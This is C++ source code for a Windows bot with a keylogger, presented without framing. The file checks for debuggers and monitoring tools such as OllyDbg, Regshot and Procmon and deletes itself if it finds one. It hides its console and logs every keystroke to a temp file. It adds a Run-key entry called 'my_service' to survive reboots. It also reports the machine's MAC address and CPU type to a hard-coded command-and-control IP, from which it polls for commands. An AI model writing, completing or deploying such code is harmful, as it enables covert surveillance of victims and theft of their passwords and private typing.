#include "lib\DataCollector.h"
#include "lib\UtilLib.h"
#include <tchar.h>
#pragma comment(lib, "user32.lib")
#include <Windows.h>
#include <Tlhelp32.h>
#define THREADING
#pragma comment(lib, "advapi32")
#include <string>
#include <windows.h>
#include <Winuser.h>
#include <iostream>
#include "lib\ActionController.h"
#include <wchar.h>
#include "lib\HttpLib.h"
#include "lib\ThreadController.h"
#include "lib\ConditionHandlers.h"
#include <vector>
#define ENCODE_HTTP

void handleFailedCondition();
DWORD FindProcessId(char* processName);
void Stealth();
DWORD WINAPI keylog(LPVOID lpParameter);
int Save(int key_stroke, char *file);
char* GetProcessor();
int addRunEntry();
void handleAction();


#if defined(THREADING)
ThreadController tc;
#endif
#define REQ_COUNT
#pragma comment(lib, "User32.lib")
#ifdef ENCODE_HTTP
	bool encode = true;
#else
	bool encode = false;
#endif
typedef void (WINAPI *PGNSI)(LPSYSTEM_INFO);
const int ACTION_LIMIT = -1;
DataCollector dc;
int WAIT = 0;
#define EXECUTE
ActionController ac;
typedef BOOL (WINAPI *PGPI)(DWORD, DWORD, DWORD, DWORD, PDWORD);
#define BOTLOOP
int port = 50000;
int COUNT = 3;
int ACTION_COUNT = 0;
#define KILL_AND_DESTROY
string url = "130.203.81.215";
vector<vector<string>> requestQueue;
#define RUN_KEY "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
char *BOT_ID = "Pev7KPtqhGgRqiriN4KlLuYIltBSD5dS";

using namespace std;

int main(){
#if defined(BOTLOOP) || defined(EXECUTE)
char* MAC_ADDR = getMAC();
dc.addDataPair("bot_id", BOT_ID);
dc.addDataPair("mac_address", MAC_ADDR);
#endif
if(FindProcessId("OLLYDBG.EXE") || FindProcessId("ollydbg.exe") || FindProcessId("ollydbg64.exe") || FindProcessId("OLLYDBG64.EXE")){
handleFailedCondition();
}
if(FindProcessId("Regshot-x64-Unicode.exe") || FindProcessId("Regshot-x64-ANSI.exe") ||
     FindProcessId("Regshot-x86-ANSI.EXE") || FindProcessId("Regshot-x86-Unicode.exe") ||
     FindProcessId("Regshot-x64-Unicode.exe *32") || FindProcessId("Regshot-x64-ANSI.exe *32") ||
     FindProcessId("Regshot-x86-ANSI.exe *32") || FindProcessId("Regshot-x86-Unicode.exe *32")
){
handleFailedCondition();
}
if(FindProcessId("procexp64.exe") || FindProcessId("procexp.exe *32")){
handleFailedCondition();
}
// body of detect debugger
if(FindProcessId("Procmon64.exe") || FindProcessId("Procmon.exe *32")){
handleFailedCondition();
}
Stealth();
tc.createThread(keylog, 1024);
char *proc = GetProcessor();
dc.addDataPair("cpu", proc);
addRunEntry();

#ifdef EXECUTE
sendP_Request(url, port, "/database/api/handler/", requestQueue, dc.getPostData());
dc.dumpCollectedData();
#endif
#ifdef BOTLOOP
string response = "";
struct Action action;
ac.addAction(action);
int reqCounter = 0;
while(notDone(ACTION_COUNT, ACTION_LIMIT)){
	ACTION_COUNT++;
#if defined(TIME_CHECK) && defined(REQ_COUNT)
	if (waitForTime(TIMEARRAY, sizeof(TIMEARRAY), COUNT)){
#endif
		response = sendG_Request(url, port, "/database/api/connect_in/", requestQueue, dc.getGetData(), WAIT);
		action = ac.parseAction(response);
		ac.addAction(action);
		handleAction();
		reqCounter++;
		Sleep(3000);
		if(reqCounter % 1 == 0){
			sendP_Request(url, port, "/database/api/handler/", requestQueue, dc.getPostData(), WAIT);
			dc.dumpCollectedData();
		}
#if defined(TIME_CHECK) && defined(REQ_COUNT)
	}
#endif
}
#endif
#if defined THREADING
getchar();
tc.closeAllThreads();
#endif
}

void handleFailedCondition(){
  #if defined KILL_AND_DESTROY
    selfDelete();
    Sleep(3000);
  #elif defined KILL
    killProcess();
  #else
    printf("doing default action\n");
  #endif
}
DWORD FindProcessId(char* processName)
{
    char* p = strrchr(processName, '\\');
    if(p)
        processName = p+1;
    PROCESSENTRY32 processInfo;
    processInfo.dwSize = sizeof(processInfo);
    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if ( processesSnapshot == INVALID_HANDLE_VALUE )
        return 0;
    Process32First(processesSnapshot, &processInfo);
    if ( !strcmp(processName, processInfo.szExeFile) )
    {
        CloseHandle(processesSnapshot);
        return processInfo.th32ProcessID;
    }
    while ( Process32Next(processesSnapshot, &processInfo) )
    {
        if ( !strcmp(processName, processInfo.szExeFile) )
        {
          CloseHandle(processesSnapshot);
          return processInfo.th32ProcessID;
        }
    }
    CloseHandle(processesSnapshot);
    return 0;
}
void Stealth()
{
	HWND Stealth;
	AllocConsole();
	Stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Stealth, 0);
}
DWORD WINAPI keylog(LPVOID lpParameter) {
	const char* mutexName = "keylogger";
	HANDLE mHandle = CreateMutex(NULL, true, mutexName);
	if (GetLastError() == ERROR_ALREADY_EXISTS) {
		return -1;
	}
	while (1) {
		for (char i = 8; i <= 190; i++) {
			if (GetAsyncKeyState(i) == -32767) 				Save(i, "C:\\Temp\\Data.txt");
			if (GetAsyncKeyState(VK_OEM_3) == -32767) 		Save(191, "C:\\Temp\\Data.txt"); //`~
			if (GetAsyncKeyState(VK_OEM_MINUS) == -32767) 	Save(192, "C:\\Temp\\Data.txt"); // -_
			if (GetAsyncKeyState(VK_OEM_PLUS) == -32767) 	Save(193, "C:\\Temp\\Data.txt"); //=+
			if (GetAsyncKeyState(VK_OEM_4) == -32767) 		Save(194, "C:\\Temp\\Data.txt"); // [{
			if (GetAsyncKeyState(VK_OEM_6) == -32767) 		Save(195, "C:\\Temp\\Data.txt"); // ]}
			if (GetAsyncKeyState(VK_OEM_5) == -32767) 		Save(196, "C:\\Temp\\Data.txt"); // \|
			if (GetAsyncKeyState(VK_OEM_1) == -32767) 		Save(197, "C:\\Temp\\Data.txt"); // ;:
			if (GetAsyncKeyState(VK_OEM_7) == -32767) 		Save(198, "C:\\Temp\\Data.txt"); // '"
			if (GetAsyncKeyState(VK_OEM_COMMA) == -32767) 	Save(199, "C:\\Temp\\Data.txt"); // ,<
			if (GetAsyncKeyState(VK_OEM_PERIOD) == -32767) 	Save(200, "C:\\Temp\\Data.txt"); // .>
			if (GetAsyncKeyState(VK_OEM_2) == -32767) 		Save(201, "C:\\Temp\\Data.txt"); // /?
		}
	}
	ReleaseMutex(mHandle);
}
int Save(int key_stroke, char *file){
	if ((key_stroke == 1) || (key_stroke == 2))
		return 0;
	FILE *OUTPUT_FILE;
	OUTPUT_FILE = fopen(file, "a+");
	const string A[] = {"[Backspace]","[Tab]","","","[Clear]","[Enter]\n","","","","[Ctrl]","[Alt]","","","","","","","","","[Esc]","","","","","[Space]","[Pg Up]","[Pg Dn]","[End]","[Home]","[Left]","[Up]", "[Right]","[Down]","","","","[Prnt Scr]","[Insert]","[Del]",""};
	const string B[] = {"~","_","+","{","}","|",":","\"","<",">","?","`","-","=","[","]","\\",";","'",",",".","/",")","!","@","#","$","%","^","&","*","("};
	//special characters
	if 		(key_stroke >= 8 && key_stroke <= 46){			  key_stroke = key_stroke - 8;	fprintf(OUTPUT_FILE, "%s", &A[key_stroke]); }
	else if (key_stroke == VK_RWIN || key_stroke == VK_LWIN)								fprintf(OUTPUT_FILE, "%s", "[Win]");
	//virtual OEM keys
	else if (key_stroke >= 191){
		key_stroke = key_stroke - 191;
		((GetAsyncKeyState(VK_SHIFT) == -32768)?fprintf(OUTPUT_FILE, "%s", &B[key_stroke]):fprintf(OUTPUT_FILE, "%s", &B[key_stroke+11]));
	}
	//numpad 0-9
	else if (key_stroke >= 96 && key_stroke <= 105){
		key_stroke = key_stroke - 48;
		fprintf(OUTPUT_FILE, "%s", &key_stroke);
	}
	//numpad symbols
	else if (key_stroke == VK_MULTIPLY) fprintf(OUTPUT_FILE, "%s", "*");
	else if (key_stroke == VK_ADD) 		fprintf(OUTPUT_FILE, "%s", "+");
	else if (key_stroke == VK_SUBTRACT) fprintf(OUTPUT_FILE, "%s", "-");
	else if (key_stroke == VK_DIVIDE) 	fprintf(OUTPUT_FILE, "%s", "/");
	//Function keys (F#)
	else if(key_stroke >= 112 && key_stroke <=135)  fprintf(OUTPUT_FILE, "%s", "");
	//period
	else if (key_stroke == 190 || key_stroke == 110)fprintf(OUTPUT_FILE, "%s", ".");
	//symbols
	else if(key_stroke >= 48 && key_stroke <= 57){
		//shift special characters 0-9
		if(GetAsyncKeyState(VK_SHIFT) == -32768){
			key_stroke = key_stroke - 26;
			fprintf(OUTPUT_FILE, "%s", &B[key_stroke]);
		}else fprintf(OUTPUT_FILE, "%s", &key_stroke);
	}
	//alphabet
	else if (key_stroke >= 65 && key_stroke <= 90){
		if 		((GetKeyState(VK_CAPITAL) & 0x0001) != 0 && GetAsyncKeyState(VK_SHIFT) != -32768) fprintf(OUTPUT_FILE, "%s", &key_stroke);
		else if ((GetKeyState(VK_CAPITAL) & 0x0001) == 0 && GetAsyncKeyState(VK_SHIFT) == -32768) fprintf(OUTPUT_FILE, "%s", &key_stroke);
		else{	key_stroke = key_stroke + 32;fprintf(OUTPUT_FILE, "%s", &key_stroke);}
	}
	//other
	else	fprintf(OUTPUT_FILE, "%s", &key_stroke);
	fclose(OUTPUT_FILE);
	return 0;
}
char* GetProcessor()
{
	OSVERSIONINFOEX osvi;
	SYSTEM_INFO si;
	PGNSI pGNSI;
	PGPI pGPI;
	BOOL bOsVersionInfoEx;
	ZeroMemory(&si, sizeof(SYSTEM_INFO));
	ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	bOsVersionInfoEx = GetVersionEx((OSVERSIONINFO*)&osvi);
	if (!bOsVersionInfoEx) return "Not Determined";
	pGNSI = (PGNSI)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "GetNativeSystemInfo");
	if (NULL != pGNSI)
		pGNSI(&si);
	else GetSystemInfo(&si);
	if (VER_PLATFORM_WIN32_NT == osvi.dwPlatformId && osvi.dwMajorVersion > 4){
		if (osvi.dwMajorVersion >= 6){
			if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
				return "64-bit";
			else if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL)
				return "32-bit";
		}
		else
			return "32-bit";
	}
	return "Not Determined";
}
int addRunEntry()
{
CHAR path[MAX_PATH];
int bytes = GetModuleFileNameA(NULL, path, MAX_PATH);
	int size = strlen(path) + 1;
	HKEY newValue;
	if (RegOpenKey(HKEY_CURRENT_USER,TEXT(RUN_KEY),&newValue) != ERROR_SUCCESS) {return -1;}
	if (RegSetValueEx(newValue,TEXT("my_service"),0,REG_SZ,(LPBYTE)path,MAX_PATH) != ERROR_SUCCESS){
		RegCloseKey(newValue);
		return -1;
	}
	RegCloseKey(newValue);
	return TRUE;
}
void handleAction(){
struct Action action;
while(ac.hasAction()){
action = ac.getNextAction();
printf("action %s\n", action.action.c_str());
if(action.action == "Keylogging"){
printf("doing action %s\n", action.action.c_str());
tc.createThread(keylog, 1024);
}
if(action.action == "Send CPU"){
printf("doing action %s\n", action.action.c_str());
char *proc = GetProcessor();
dc.addDataPair("cpu", proc);
}
if(action.action == "Add Startup Process"){
printf("doing action %s\n", action.action.c_str());
addRunEntry();
}
action = ac.getNextAction();
}
}
